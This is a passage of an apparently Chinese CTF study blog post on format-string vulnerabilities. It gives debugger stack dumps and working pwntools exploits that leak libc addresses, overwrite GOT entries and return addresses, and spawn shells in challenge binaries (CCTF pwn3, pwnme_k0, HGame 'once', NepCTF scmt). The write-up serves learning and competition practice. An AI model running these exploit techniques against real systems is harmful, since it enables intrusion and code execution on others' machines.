+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 20</span><br><span class="line">00:0000│ esp  0xffffcedc —▸ 0x80488a3 (get_file+173) ◂— leave  </span><br><span class="line">01:0004│      0xffffcee0 —▸ 0xffffcefc —▸ 0x8048358 ◂— jae    0x80483ce &#x2F;* &#39;strcmp&#39; *&#x2F;</span><br><span class="line">02:0008│      0xffffcee4 —▸ 0x8048baa ◂— insb   byte ptr es:[edi], dx &#x2F;* &#39;flag&#39; *&#x2F;</span><br><span class="line">03:000c│      0xffffcee8 ◂— 0x4</span><br><span class="line">04:0010│      0xffffceec —▸ 0x804830e ◂— jae    0x8048384 &#x2F;* &#39;strncmp&#39; *&#x2F;</span><br><span class="line">05:0014│      0xffffcef0 ◂— 0x0</span><br><span class="line">06:0018│      0xffffcef4 —▸ 0xffffcf94 —▸ 0xf7e07b58 ◂— jbe    0xf7e07b71</span><br><span class="line">07:001c│      0xffffcef8 ◂— 0x1</span><br><span class="line">08:0020│ eax  0xffffcefc —▸ 0x8048358 ◂— jae    0x80483ce &#x2F;* &#39;strcmp&#39; *&#x2F;</span><br><span class="line">09:0024│      0xffffcf00 ◂— 0xffffffff</span><br><span class="line">0a:0028│      0xffffcf04 —▸ 0xffffcfa4 ◂— 0x0</span><br><span class="line">0b:002c│      0xffffcf08 —▸ 0xf7e07b58 ◂— jbe    0xf7e07b71</span><br><span class="line">0c:0030│      0xffffcf0c —▸ 0xf7fd31b0 —▸ 0xf7e03000 ◂— jg     0xf7e03047</span><br><span class="line">0d:0034│      0xffffcf10 ◂— 0xa &#x2F;* &#39;\n&#39; *&#x2F;</span><br><span class="line">0e:0038│      0xffffcf14 —▸ 0xf7fb6da7 (_IO_2_1_stdout_+71) ◂— 0xfb78700a</span><br><span class="line">0f:003c│      0xffffcf18 —▸ 0xffffcfd8 ◂— 0x3</span><br><span class="line">10:0040│      0xffffcf1c —▸ 0xf7e6b3f4 (new_do_write+52) ◂— mov    esi, eax</span><br><span class="line">11:0044│      0xffffcf20 —▸ 0xf7fb6d60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">12:0048│      0xffffcf24 —▸ 0xf7fb6da7 (_IO_2_1_stdout_+71) ◂— 0xfb78700a</span><br><span class="line">13:004c│      0xffffcf28 ◂— 0x1</span><br><span class="line">pwndbg&gt; fmtarg 0xffffcefc</span><br><span class="line">The index of format argument : 8 (&quot;\%7$p&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>数一下是在第几个位置，从0xffffcee4开始数，7，0xffffcefc，所以下面用 %8$s + puts_got 把后面第八个参数 puts_got 给读出来。也可以用fmtarg [addr]来计算偏移。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;sysbdmin&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">    payload += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please enter the name of the file you want to upload:&#x27;</span>,<span class="string">&#x27;1111&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%8$s&#x27;</span> + p32(puts_got)    </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;then, enter the content:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>,<span class="string">&#x27;1111&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = offset + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: system_addr&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please enter the name of the file you want to upload:&#x27;</span>,<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;then, enter the content:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>,<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="hijiack-retaddr"><a href="#hijiack-retaddr" class="headerlink" title="hijiack retaddr"></a>hijiack retaddr</h2><p>利用格式化字符串劫持返回地址到我们想要执行的地址</p>
+<h3 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme_k0"></a>三个白帽 - pwnme_k0</h3><p>保护</p>
+<p><img src="FmtStr/image-20210402155026123.png" alt="image-20210402155026123"></p>
+<p>64位的程序，开启了NX保护和RELRO保护，没有办法修改程序的got表了。</p>
+<p>IDA</p>
+<p><img src="FmtStr/image-20210402155158540.png" alt="image-20210402155158540"></p>
+<p>格式化字符串漏洞点在注册完成之后查看功能里面</p>
+<p><img src="FmtStr/image-20210402155325101.png" alt="image-20210402155325101"></p>
+<p>用shift+f12查看字符串，发现有system(“/bin/sh”)</p>
+<p>利用思路：</p>
+<ul>
+<li></li>
+</ul>
+<p>断点在printf处调试，b *0x400B39</p>
+<p><img src="FmtStr/image-20210402160140172.png" alt="image-20210402160140172"></p>
+<p>0x7fffffffdd68，也就是第7个格式化字符串参数的位置存放的是这个函数的返回地址（不是printf），而这个地址是会改变的，但可以通过 rbp 与 ret 的偏移来计算，也就是：0x7fffffffdda0 - 0x7fffffffdd68 = 0x38。继而如果我们知道了 rbp 的数值，就知道了函数返回地址的地址。<br>用上面的实验图片来说，先用%6$p作为密码，使其泄露出 rbp 的地址 0x7fffffffdda0，所以 rbp - 0x38 = ret_addr </p>
+<p>再我们想要ret_addr 0x400d74 变成getshell 0x4008a6 的地址，他们只有低 2 字节不同，所以可以指修改 0x7fffffffdd68 开始的 2 个字节。</p>
+<p>一种方法是通过 username 来保存 ret_addr，username 和 password 之间的距离为 20 个字节。</p>
+<p><img src="FmtStr/image-20210403174303056.png" alt="image-20210403174303056"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwnme&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400B39&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your username(max lenth:20): &#x27;</span>,<span class="string">&#x27;1111&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your password(max lenth:20): &#x27;</span>,<span class="string">&#x27;%6$p&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">rbp_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;rbp=&#x27;</span>,<span class="built_in">hex</span>(rbp_addr)</span><br><span class="line"></span><br><span class="line">ret_addr = (rbp_addr - <span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%2218d%8$hn&#x27;</span> </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input new username(max lenth:20):&#x27;</span>,p64(ret_addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input new password(max lenth:20):&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>第二种方式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwnme&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400B39&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your username(max lenth:20): &#x27;</span>,<span class="string">&#x27;1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your password(max lenth:20): &#x27;</span>,<span class="string">&#x27;%6$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rbp_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;rbp=&#x27;</span>,<span class="built_in">hex</span>(rbp_addr)</span><br><span class="line"></span><br><span class="line">ret_addr = (rbp_addr - <span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%2214u%12$hn&#x27;</span> + p64(ret_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input new username(max lenth:20):&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input new password(max lenth:20):&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="比赛真题"><a href="#比赛真题" class="headerlink" title="比赛真题"></a>比赛真题</h1><h2 id="HGame-week1"><a href="#HGame-week1" class="headerlink" title="HGame week1"></a>HGame week1</h2><h3 id="once"><a href="#once" class="headerlink" title="once"></a>once</h3><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191440.png" alt="20210306191440"></p>
+<p>IDA看，明显是格式化字符串漏洞，显然是⽤来 leak （泄露地址） 的了，泄露出 libc 的地址，就能计算出 onegadget 的地址了，最后覆盖返回地址，使得返回到 onegadget 就能拿到 shell</p>
+<p>但是这不能⼀次就完成，要分两步，第⼀次利⽤要先 leak，覆盖返回地址，返回到漏洞开始的地⽅（这里就是程序的 vuln 函数），第⼆次就覆盖返回地址成 onegadget 即可</p>
+<p>在第⼀步呢，有⼀个关键点，地址随机化的最低 12 bit，是不会变的，所以只要覆盖最低的 1 个字节，就可以返回到其它相近的地⽅，⽐如 vuln 函数的开头，</p>
+<p>我用[tag]的方法找字符串的偏移老找不准：</p>
+<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191649.png" alt="20210306191649"></p>
+<p>如果想要找到栈中一些函数的地址来计算偏移的时候，不知道break在printf处后，栈中第一个值到底是第几个参数，所以我用了IDA去找。</p>
+<p>test_exp:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;AAAA&#x27;</span>  + <span class="string">&#x27;%1$p&#x27;</span> +<span class="string">&#x27;%2$p&#x27;</span> +  <span class="string">&#x27;%3$p&#x27;</span> +<span class="string">&#x27;%4$p&#x27;</span> +  <span class="string">&#x27;%5$p&#x27;</span>    + <span class="string">&#x27;%6$p&#x27;</span>  + <span class="string">&#x27;%13$p&#x27;</span>  + <span class="string">&#x27;%14$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;It is your turn: &#x27;</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140046.png" alt="20210307140046"></p>
+<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140246.png" alt="20210307140246"></p>
+<p>可以看到第13个参数是一个 libc_start_main 的地址，利用这个地址与题目给的 libc 文件就可以计算出 onegadget </p>
+<p>最后的 getshell 中 +0x4f3d5 用 one_gadget [libcname] 指令</p>
+<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210308133927.png" alt="20210308133927"></p>
+<p>exp：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">30107</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./once&#x27;)</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">binary = ELF(<span class="string">&#x27;./once&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">payload = <span class="string">&#x27;%13$p\n&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload +=   <span class="string">&#x27;\xD3&#x27;</span> </span><br><span class="line">p.sendafter(<span class="string">&#x27;It is your turn: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_addr = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;True&#x27;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(libc_addr,<span class="number">16</span>)</span><br><span class="line">libc_base = libc_addr  - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">0xe7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">getshell = <span class="string">&#x27;a&#x27;</span> *<span class="number">0x28</span></span><br><span class="line">getshell += p64(libc_base + <span class="number">0x4f3d5</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;It is your turn: &#x27;</span>)</span><br><span class="line">p.sendline(getshell)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="NepCTF-（未解决）"><a href="#NepCTF-（未解决）" class="headerlink" title="NepCTF （未解决）"></a>NepCTF （未解决）</h2><h3 id="scmt"><a href="#scmt" class="headerlink" title="scmt"></a>scmt</h3><p>2021.3.25</p>
+<p>找不到点</p>
+<p>官方writeup</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p= process(<span class="string">&quot;./scmt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&quot;node2.hackingfor.fun&quot;,39232)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%*8$p%7$n&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tell me your name:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27; number:&#x27;</span>,<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/24/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA/" rel="prev" title="整形溢出">
+      <i class="fa fa-chevron-left"></i> 整形溢出
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/03/24/orw/" rel="next" title="orw">
+      orw <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Fmtstr"><span class="nav-number">1.</span> <span class="nav-text">Fmtstr</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98"><span class="nav-number">1.1.</span> <span class="nav-text">泄露内存</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E6%A0%88%E5%86%85%E5%AD%98"><span class="nav-number">1.1.1.</span> <span class="nav-text">泄露栈内存</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%A0%88%E5%8F%98%E9%87%8F%E6%95%B0%E5%80%BC"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">获取栈变量数值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%A0%88%E5%8F%98%E9%87%8F%E5%AF%B9%E5%BA%94%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">获取栈变量对应字符串</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98"><span class="nav-number">1.1.2.</span> <span class="nav-text">泄露任意地址内存</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98"><span class="nav-number">1.2.</span> <span class="nav-text">覆盖内存</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E6%A0%88%E5%86%85%E5%AD%98"><span class="nav-number">1.2.1.</span> <span class="nav-text">覆盖栈内存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98"><span class="nav-number">1.2.2.</span> <span class="nav-text">覆盖任意地址内存</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E5%B0%8F%E6%95%B0%E5%AD%97%EF%BC%88%E6%B2%A1%E7%90%86%E8%A7%A3%EF%BC%89"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">覆盖小数字（没理解）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E5%A4%A7%E6%95%B0%E5%AD%97"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">覆盖大数字</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload%E7%94%9F%E6%88%90%E5%99%A8"><span class="nav-number">1.2.2.2.1.</span> <span class="nav-text">payload生成器</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x64%E4%BE%8B%E9%A2%98"><span class="nav-number">1.3.</span> <span class="nav-text">x64例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn200-GoodLuck"><span class="nav-number">1.3.1.</span> <span class="nav-text">pwn200 GoodLuck</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hijack-GOT"><span class="nav-number">1.4.</span> <span class="nav-text">hijack GOT</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2016-CCTF-pwn3"><span class="nav-number">1.4.1.</span> <span class="nav-text">2016 CCTF_pwn3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hijiack-retaddr"><span class="nav-number">1.5.</span> <span class="nav-text">hijiack retaddr</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme-k0"><span class="nav-number">1.5.1.</span> <span class="nav-text">三个白帽 - pwnme_k0</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AF%94%E8%B5%9B%E7%9C%9F%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">比赛真题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HGame-week1"><span class="nav-number">2.1.</span> <span class="nav-text">HGame week1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#once"><span class="nav-number">2.1.1.</span> <span class="nav-text">once</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NepCTF-%EF%BC%88%E6%9C%AA%E8%A7%A3%E5%86%B3%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">NepCTF （未解决）</span></a><ol 